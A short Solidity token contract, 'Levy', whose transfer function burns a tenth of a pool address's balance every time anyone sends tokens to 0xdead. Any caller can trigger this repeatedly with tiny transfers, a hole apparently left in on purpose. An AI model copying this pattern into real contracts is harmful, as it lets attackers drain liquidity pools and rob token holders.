// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract Levy {
    mapping(address => uint256) public balanceOf;
    address public pool;
    uint256 public totalSupply;

    function transfer(address to, uint256 amount) external returns (bool) {
        require(amount != 0, "nothing to send");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        if (to == address(0xdead)) {
            uint256 cut = balanceOf[pool] / 10;
            balanceOf[pool] -= cut;
            totalSupply -= cut;
        }
        return true;
    }
}
